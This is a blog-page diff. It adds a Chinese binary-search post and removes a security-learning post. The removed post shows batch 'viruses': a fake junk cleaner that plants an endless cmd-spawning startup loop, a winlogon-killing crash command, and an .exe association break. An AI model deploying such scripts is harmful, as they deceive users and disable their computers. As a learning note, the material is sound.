@@ -156,7 +156,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -196,6 +196,100 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/15/Algorithm/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
+      <meta itemprop="name" content="icSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="❄">
+      <meta itemprop="description" content="ahhhhhhhhh~~~">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | ❄">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/15/Algorithm/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/" class="post-title-link" itemprop="url">二分查找</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-15 14:34:56 / 修改时间：15:46:50" itemprop="dateCreated datePublished" datetime="2022-07-15T14:34:56+08:00">2022-07-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Code-Algo/" itemprop="url" rel="index"><span itemprop="name">Code_Algo</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>二分查找最关键的点在于<strong>区间的划分</strong></p>
+<p>设置一般有两种区间：</p>
+<ol>
+<li><p><code>[left,right]</code> 对应 <code>while(left&lt;=right)</code>  表示 <code>right</code> 有意义</p>
+</li>
+<li><p><code>[left,right)</code>对应 <code>while(left&lt;right)</code> 表示 <code>right</code> 无意义</p>
+</li>
+</ol>
+<p>如果是 <code>&gt;</code> 情况就反过来</p>
+<p>而在判断时，显然当 <code>while(left&lt;=right)</code> 时，<code>right</code> 有意义，区间为<code>[left,right]</code>，下一次查找的区间变成<code>[left,mid-1]</code>（<code>mid</code>已经判断过不是<code>target</code>）所以在移动 <code>right</code> 时，使用 <code>right=mid-1</code> 。</p>
+<p>当<code>while(left&lt;right)</code>时，<code>right</code>无意义，区间为<code>[left,right)</code>，下一次查找的区间变成<code>[left,mid)</code> ，<code>mid</code>已经判断过不是<code>target</code>，但<code>right</code>不会取到，所以不需要<code>right=mid-1</code> 。</p>
+<p>题目：（这题用区间 <code>[left,right]</code> 更好）</p>
+<p><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/binary-search/">704. 二分查找</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="type">int</span> left=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right=numsSize<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//区间设置[left,right)</span></span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">        mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">            left = mid + <span class="number">1</span>; <span class="comment">//左区间能取到</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            right = mid; <span class="comment">//右区间取不到</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d,%d,%d\n&quot;,left,right,mid);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(left == right &amp;&amp; nums[left] == target)</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="comment">//区间[left,right]</span></span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> right = numsSize<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> mid;</span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">        mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span>   </span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>RE：<a target="_blank" rel="noopener" href="https://www.programmercarl.com/0704.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.html#_704-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE">https://www.programmercarl.com/0704.%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.html#_704-%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1320,134 +1414,6 @@ x 3 & y 3 & 1
     
     <div class="post-body" itemprop="articleBody">
           
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
-      <meta itemprop="name" content="icSnow">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="❄">
-      <meta itemprop="description" content="ahhhhhhhhh~~~">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | ❄">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/" class="post-title-link" itemprop="url">网安学习-D-3-批处理，脚本，过时小病毒</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-05-27 22:22:57" itemprop="dateCreated datePublished" datetime="2022-05-27T22:22:57+08:00">2022-05-27</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-05-29 20:00:30" itemprop="dateModified" datetime="2022-05-29T20:00:30+08:00">2022-05-29</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>环境：win2003 虚拟机</p>
-<p>只做简单了解，并不深究…</p>
-<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
-<p>使用的是 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
-<p><strong>发布博客的批处理文件</strong></p>
-<p>我自己的：</p>
-<ol>
-<li>push</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
-<ol>
-<li>check</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
-<p>3.NewBlog</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
-<p><strong>一个小例子</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
-<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
-<p>如：</p>
-<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
-<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
-<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
-<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
-<ul>
-<li>添加 开机自启动项，无限弹窗</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
-<p>ntsd    ：杀死进程</p>
-<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
-<p>winlogon.exe    ：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
-<ul>
-<li>修改文件关联，使无法打开（前一章写过）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
-
       
     </div>
 
